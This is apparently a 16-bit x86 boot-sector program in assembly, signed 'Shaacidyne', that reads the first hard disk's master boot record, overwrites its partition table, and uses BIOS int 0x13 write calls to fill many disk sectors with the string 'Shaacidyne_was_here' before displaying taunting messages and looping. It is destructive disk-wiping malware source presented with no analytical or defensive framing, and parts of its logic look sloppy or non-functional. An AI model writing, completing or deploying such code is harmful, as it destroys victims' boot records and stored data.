[org 0x7C00]

eins:
    mov ax, 0x07C0
    mov ds, ax
    mov es, ax
    mov fs, ax
    mov gs, ax
    mov ss, ax
    mov sp, 0x7C00

    mov si, sayonara_tehehe
    call fünf

    call drei


    jmp vier

    jmp $ 


zwei:
    push di
    mov di, [si]          
    call fünf
    add si, 2            
    pop di
    ret


drei:

    mov word [msg_ptr_table], msg1
    mov word [msg_ptr_table + 2], msg2
    mov si, msg_ptr_table 

    mov si, uwu_key
    mov cx, 5
.decrypt_loop:
    lodsb
    loop .decrypt_loop

    call sechs
    mov di, 0x7C00 + 0x1BE
    mov cx, 4 * 16
.overwrite_pt_loop:
    stosb
    loop .overwrite_pt_loop
    call sieben

    mov cx, 255
    mov dh, 0x00        
.sector_wipe_loop_outer:
    push cx


    mov cl, 0x01        
.sector_wipe_loop_inner:
    call zehn

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03       
    mov al, 0x01        
    mov ch, 0x00       

    mov dl, 0x80        
    int 0x13


    call zwei

    cmp cl, 18          
    jae .inner_loop_done
    inc cl               
    jmp .sector_wipe_loop_inner

.inner_loop_done:
    pop cx
    inc dh               
    cmp dh, 2          
    jae .outer_loop_done
    loop .sector_wipe_loop_outer

.outer_loop_done:

    call acht
    call elf
    call neun
    ret


vier:
    mov si, msg1
    call fünf
    mov si, msg2
    call fünf
    mov ah, 0x00
    int 0x16 

    jmp vier


fünf:
    mov ah, 0x0E
.print_loop:
    mov al, [si]
    cmp al, 0x00
    je .print_done
    int 0x10
    inc si
    jmp .print_loop
.print_done:
    ret

sechs:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x02
    mov al, 0x01
    mov ch, 0x00
    mov cl, 0x01
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    ret

sieben:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03
    mov al, 0x01
    mov ch, 0x00
    mov cl, 0x01
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    ret

acht:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x02
    mov al, 0x01
    mov ch, 0x00
    mov cl, 0x02
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    ret

neun:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03
    mov al, 0x01
    mov ch, 0x00
    mov cl, 0x02
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    ret

zehn:
    pusha
    mov di, 0x7C00
    mov cx, 512 / 9
    mov si, uwu_uwu
.fill_loop:
    push cx
    mov cx, 9
.copy_string:
    mov al, [si]
    stosb
    inc si
    loop .copy_string
    mov si, uwu_uwu
    pop cx
    loop .fill_loop
    mov cx, 512 % 9
    mov al, 'U'
.fill_remainder:
    stosb
    loop .fill_remainder
    popa
    ret

elf:
    pusha
    mov di, 0x7C00 + 0x03
    mov al, 'w'
    stosb
    stosb
    stosb
    stosb
    stosb
    popa
    ret


sayonara_tehehe: db 'Shaacidyne_was_here', 0x0D, 0x0A, 0x00
uwu_uwu: db 'Shaacidyne_was_here', 0x00
Ayaya_OwO: db 'UwU', 0x00
uwu_key: db 'UwUo', 'OwOo', 'UwUo', 'OwOo', 'UwUo'


msg1: db 'This is my world without you, bro. Empty. T-T', 0x0D, 0x0A, 0x00
msg2: db 'Stay with me or you will not see me again forever. -Shaacidyne', 0x0D, 0x0A, 0x00


msg_ptr_table: dw 0, 0

times 510-($-$$) db 0
dw 0xAA55
